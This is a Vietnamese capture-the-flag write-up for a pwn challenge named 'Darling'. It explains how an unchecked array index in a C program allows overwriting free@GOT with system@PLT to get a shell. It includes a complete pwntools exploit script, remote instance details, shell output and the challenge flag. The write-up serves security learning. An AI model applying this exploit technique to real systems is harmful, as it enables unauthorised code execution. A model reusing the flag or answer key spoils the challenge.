---
title: Darling
category: pwn
techniques: out-of-bounds-write, got-overwrite, ret2plt, integer-index-arithmetic
summary: Khai thác chỉ số mảng không được kiểm tra để ghi đè free@GOT bằng system@PLT, khiến free(name) trở thành system("/bin/sh").
---

## Đề bài

Challenge cung cấp binary `Darling` và source code C. Chương trình nhận tên người dùng, tạo một mảng global gồm 10 số ngẫu nhiên, sau đó cho nhập `index` và `new_value` để thay đổi một phần tử trong mảng.

Đoạn code quan trọng:

```c
int a[10];

int index = read_num();
int new_value = read_num();

a[index] = new_value;

if (rand() == rand()) {
    system("/bin/sh");
}

free(name);
```

Mảng `a` chỉ có 10 phần tử, nhưng chương trình không kiểm tra `index` có nằm trong khoảng từ 0 đến 9 hay không. Vì vậy, người dùng có thể truy cập ngoài phạm vi mảng và ghi vào vùng nhớ khác.

Mục tiêu của bài là tận dụng lỗi ghi này để thay đổi địa chỉ hàm được gọi sau đó, từ đó lấy shell.

## Kỹ thuật sử dụng

- **out-of-bounds-write**: `a[index] = new_value` không kiểm tra giới hạn `index`, cho phép ghi trước hoặc sau mảng global.
- **got-overwrite**: tận dụng vị trí ghi ngoài mảng để thay đổi entry `free` trong Global Offset Table.
- **ret2plt**: ghi địa chỉ `system@PLT` vào `free@GOT`, chuyển hướng lời gọi `free(name)` sang `system(name)`.
- **abi-compatible-function-redirection**: `free(void *)` và `system(const char *)` đều nhận đối số đầu tiên qua `RDI` trên Linux x86-64; chuỗi `/bin/sh` có thể được dùng làm đối số khi lời gọi bị chuyển hướng.
- **binary-inspection**: dùng `checksec`, `nm`, `objdump`, `readelf` hoặc IDA để xác định mitigation, symbol và relocation.

## Cách giải

### Bước 1. Đọc source code và xác định thao tác nguy hiểm

Hàm nhập số:

```c
int read_num()
{
    char buffer[0x10];
    fgets(buffer, 0x10, stdin);
    buffer[strlen(buffer)] = 0;
    return atoi(buffer);
}
```

Hàm đọc tên:

```c
char *read_str()
{
    char *buffer = malloc(0x10);
    fgets(buffer, 0x10, stdin);
    buffer[strlen(buffer)] = 0;
    return buffer;
}
```

Hai hàm dùng `fgets` với giới hạn 16 byte. Điểm cần tập trung không phải là một buffer overflow trong hai hàm này, mà là phép ghi vào mảng:

```c
a[index] = new_value;
```

Không có điều kiện kiểu `index >= 0 && index < 10`. Do `index` do người dùng nhập, ta có thể thử tính địa chỉ của những phần tử nằm ngoài mảng.

Với `int a[]`, mỗi phần tử thường chiếm 4 byte trên binary này:

\[
\operatorname{addr}(a[index]) = \operatorname{addr}(a) + 4 \times index
\]

### Bước 2. Kiểm tra mitigation bằng checksec

Chạy:

```bash
checksec --file=./Darling
```

Kết quả thu được:

```text
RELRO           No RELRO
STACK CANARY    Canary found
NX              NX enabled
PIE             No PIE
```

Ý nghĩa đối với hướng khai thác:

| Mitigation | Kết quả | Ý nghĩa |
|---|---|---|
| RELRO | No RELRO | GOT không bị khóa chỉ đọc bởi Full RELRO; cần kiểm tra vị trí ghi có thực sự dùng được. |
| PIE | No PIE | Địa chỉ code và global của executable ổn định giữa các lần chạy cùng binary. |
| NX | Enabled | Không nên dựa vào thực thi shellcode trên stack; hướng chuyển hướng lời gọi hàm phù hợp hơn. |
| Stack Canary | Found | Bảo vệ một số tình huống ghi đè stack; lỗi đang dùng nhắm vào vùng global/GOT, không phải return address trên stack. |

No RELRO và No PIE không tự tạo ra lỗ hổng. Chúng chỉ làm hướng GOT overwrite thuận lợi hơn khi đã có primitive ghi ngoài phạm vi.

### Bước 3. Tìm địa chỉ mảng `a`

Dùng `nm` để xem symbol của binary:

```bash
nm -n ./Darling
```

Trong danh sách symbol, tìm dòng có tên `a`. Kết quả của challenge:

```text
00000000004034e0 B a
```

Vậy:

```text
a = 0x4034e0
```

Ký hiệu `B` cho biết `a` nằm trong vùng BSS (biến global được khởi tạo zero hoặc không có dữ liệu khởi tạo tường minh).

### Bước 4. Tìm `free@GOT` mà không cần dùng grep

Trong source code có lời gọi:

```c
free(name);
```

`free()` là hàm thư viện bên ngoài. Với binary ELF liên kết động, lời gọi này thường được thực hiện thông qua PLT và GOT. Ta cần tìm relocation entry tương ứng với `free`.

Có thể in toàn bộ relocation bằng:

```bash
objdump -R ./Darling
```

Nếu output dài, chuyển qua `less`:

```bash
objdump -R ./Darling | less
```

Trong `less`:

1. Nhấn `/`.
2. Nhập `free` rồi nhấn Enter.
3. Nhấn `n` để tới kết quả tiếp theo.
4. Nhấn `q` để thoát.

Kết quả đã tìm được:

```text
0000000000403420 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
0000000000403450 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
```

Dòng `free@GLIBC_2.2.5` có relocation offset `0x403420`. Đây là địa chỉ GOT entry tương ứng với lời gọi `free` trong binary này:

```text
free@GOT = 0x403420
```

Một cách khác là dùng:

```bash
readelf -rW ./Darling | less
```

Sau đó tìm `free` bằng `/free` trong `less`. Không cần `grep`; `grep` chỉ là công cụ lọc output, không phải điều kiện để phân tích binary.

Nếu chỉ có binary mà không có source, có thể tìm lời gọi hàm trong disassembly:

```bash
objdump -d -M intel ./Darling | less
```

Trong `less`, tìm `/free@plt`. Sau đó lần ngược về hàm gọi để xem dữ liệu nào có thể ảnh hưởng tới lời gọi đó. Trong IDA, có thể xem cửa sổ Imports/Functions và lần theo cross-reference đến hàm thư viện.

### Bước 5. Tìm địa chỉ `system@PLT`

Cần phân biệt:

- `system@GOT`: ô nhớ dùng để lưu địa chỉ đích của `system`.
- `system@PLT`: đoạn mã trong executable dùng để chuyển tiếp lời gọi đến `system`.

Ta cần địa chỉ `system@PLT` để ghi vào `free@GOT`, không phải địa chỉ `system@GOT`.

Có thể tìm trong toàn bộ disassembly:

```bash
objdump -d -M intel ./Darling | less
```

Trong `less`, tìm `/system@plt` hoặc `/<system@plt>`. Một số binary dùng bố cục PLT tách riêng; khi đó có thể kiểm tra section `.plt.sec`:

```bash
readelf -SW ./Darling
objdump -d -j .plt.sec ./Darling
```

Trong exploit, pwntools đọc địa chỉ này trực tiếp bằng `ELF("./Darling").plt["system"]`. Kết quả trên binary đang phân tích:

```text
system@PLT = 0x401174
```

### Bước 6. Tính index để ghi vào `free@GOT`

Ta đã có:

```text
a         = 0x4034e0
free@GOT  = 0x403420
system@PLT= 0x401174
```

Do mỗi phần tử `a` có kích thước 4 byte:

\[
index = \frac{\operatorname{addr}(free@GOT)-\operatorname{addr}(a)}{4}
\]

Thay địa chỉ:

\[
index = \frac{0x403420-0x4034e0}{4}
       = \frac{-0xc0}{4}
       = -48
\]

Vì vậy:

```c
a[-48] = new_value;
```

sẽ tính ra địa chỉ `0x403420`, tức vị trí `free@GOT` trong binary này.

### Bước 7. Vì sao ghi 4 byte có thể đủ?

Biểu thức `a[index]` có kiểu `int`, nên phép gán chỉ ghi 4 byte. Trong khi đó, một function pointer trên x86-64 thường có kích thước 8 byte.

Địa chỉ `system@PLT` là:

```text
0x401174
```

Dạng little-endian 32-bit là:

```text
74 11 40 00
```

Phép ghi 4 byte thay phần thấp của GOT entry. Trong binary cụ thể này, các byte cao của pointer tương ứng là zero, nên sau phép ghi entry có thể trỏ tới `0x0000000000401174`.

Đây là đặc điểm phụ thuộc vào địa chỉ và trạng thái GOT của binary hiện tại; không thể mặc định rằng ghi 4 byte luôn đủ để thay một con trỏ 64-bit. Việc exploit local chạy được là bằng chứng thực nghiệm cho trường hợp này.

### Bước 8. Vì sao nhập tên `/bin/sh`?

Chương trình lưu tên người dùng trong vùng heap:

```c
char *name = read_str();
```

Sau khi thực hiện phép ghi ngoài mảng, chương trình đi tới:

```c
free(name);
```

Trên Linux x86-64 System V ABI, đối số thứ nhất của hàm được truyền qua thanh ghi `RDI`. Khi gọi `free(name)`, `RDI` chứa con trỏ đến chuỗi tên người dùng.

Nếu entry `free@GOT` đã được thay bằng địa chỉ `system@PLT`, lời gọi sau đó được chuyển hướng về `system`, vẫn nhận con trỏ `name` làm đối số. Khi `name` chứa `/bin/sh`, hành vi tương đương là:

```c
system("/bin/sh");
```

Đây là lý do payload đặt tên người dùng thành `/bin/sh`.

Trong source còn có nhánh:

```c
if (rand() == rand()) {
    system("/bin/sh");
}
```

Đây là một đường gọi shell độc lập, phụ thuộc hai lần gọi `rand()` liên tiếp cho kết quả bằng nhau. Hướng GOT overwrite không cần dựa vào nhánh ngẫu nhiên này; nó nhắm đến lời gọi `free(name)` ở cuối hàm.

### Bước 9. Exploit bằng pwntools

Tạo file `EXPLOIT.py`:

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./Darling", checksec=False)
context.binary = elf
context.log_level = "info"

# Lấy symbol và relocation trực tiếp từ ELF.
a_addr = elf.symbols["a"]
free_got = elf.got["free"]
system_plt = elf.plt["system"]

# Tính index theo kích thước phần tử int (4 byte).
assert (free_got - a_addr) % 4 == 0
index = (free_got - a_addr) // 4

log.info(f"a          = {a_addr:#x}")
log.info(f"free@GOT   = {free_got:#x}")
log.info(f"system@PLT = {system_plt:#x}")
log.info(f"index      = {index}")

# read_num() dùng atoi(), vì vậy new_value được gửi ở dạng thập phân.
# Địa chỉ system@PLT của binary này vừa với int dương.
assert 0 <= system_plt <= 0x7fffffff

p = process(elf.path)
p.sendlineafter(b"Bae, what's your name: ", b"/bin/sh")
p.sendlineafter(b"Index (0-indexed): ", str(index).encode())
p.sendlineafter(b"New value: ", str(system_plt).encode())
p.interactive()
```

Chạy:

```bash
python3 -m pip install pwntools
python3 EXPLOIT.py
```

Output địa chỉ trên binary đã phân tích:

```text
[*] a          = 0x4034e0
[*] free@GOT   = 0x403420
[*] system@PLT = 0x401174
[*] index      = -48
```

Nếu exploit thành công, chương trình in thông báo cuối rồi chuyển sang shell tương tác. Có thể kiểm tra shell bằng:

```bash
whoami
pwd
ls -la
```

Để chạy với instance remote được phép của challenge, thay `process(elf.path)` bằng:

```python
p = remote("HOST", PORT)
```

Cần xác nhận binary remote tương ứng với binary local: No PIE khiến địa chỉ ổn định trong cùng binary, nhưng không bảo đảm server dùng đúng cùng một bản build.

### Bước 10. Cách tìm GOT mà không dùng `grep`

`grep` chỉ lọc các dòng output theo từ khóa. Có thể thực hiện toàn bộ thao tác tìm kiếm thủ công bằng `less`:

**Tìm relocation của `free`:**

```bash
objdump -R ./Darling | less
```

Nhấn `/`, nhập `free`, Enter; nhấn `n` để xem kết quả tiếp theo và `q` để thoát.

**Tìm symbol `a`:**

```bash
nm -n ./Darling | less
```

Dùng `/ a` hoặc `/ a$` để tìm symbol có tên `a` trong danh sách.

**Tìm PLT stub của `system`:**

```bash
objdump -d -M intel ./Darling | less
```

Dùng `/system@plt` để tìm. Nếu không thấy, kiểm tra danh sách section bằng `readelf -SW` và xem `.plt.sec` nếu có.

Quy trình quan trọng là xác định trước mình cần tìm gì:

1. Từ source code, tìm hàm thư viện được gọi sau thao tác ghi (`free(name)`).
2. Từ relocation, tìm GOT entry của hàm đó.
3. Từ symbol table, tìm địa chỉ mảng global `a`.
4. Từ disassembly hoặc pwntools, tìm `system@PLT`.
5. Tính index theo khoảng cách địa chỉ và kích thước phần tử mảng.

Nếu binary bị strip và không còn symbol `a`, cần xác định địa chỉ vùng global bằng IDA/Ghidra hoặc phân tích disassembly; không thể mặc định `nm` luôn hiển thị tên symbol.

### Bước 11. Kiểm chứng trên instance remote

Sau khi xác nhận exploit local, thay tiến trình local bằng kết nối tới instance CTF:

```python
p = remote("136.85.118.253", 31340)
```

Giữ nguyên phần gửi tên, `index` và `new_value`. Log thực tế cho thấy chương trình in:

```text
Love you, darling ;3 I'll miss you$
```

Sau đó shell nhận lệnh và trả kết quả:

```text
$ ls
chall
flag.txt
$ cat flag.txt
BKISC{I_miss_you_so_much_I_forgot_the_index_check_e2d1f04a706a}
```

Đây là bằng chứng exploit đã hoạt động trên instance `136.85.118.253:31340`: lời gọi `free(name)` đã được chuyển hướng và shell có thể tương tác qua kết nối Pwntools.

## Flag

`BKISC{I_miss_you_so_much_I_forgot_the_index_check_e2d1f04a706a}`
